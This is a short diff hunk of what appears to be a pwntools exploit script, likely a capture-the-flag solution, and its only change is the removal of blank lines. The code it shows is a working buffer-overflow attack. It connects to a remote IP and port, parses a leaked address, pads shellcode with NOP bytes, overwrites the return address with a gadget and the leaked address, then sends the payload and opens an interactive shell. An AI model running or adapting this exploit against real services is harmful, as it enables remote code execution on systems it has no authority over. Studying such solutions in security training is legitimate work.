@@ -10,11 +10,8 @@ r = remote('142.93.113.134', 9999)
 l = r.recvline().split()[-1:]
 
 shell += b'\x90' * (136 - len(shell))
-
 shell += p64(0x0400496) + p64(int(l[0], 16))
 
 # sys.stdout.buffer.write(shell)
-
 r.sendline(shell)
-
 r.interactive()
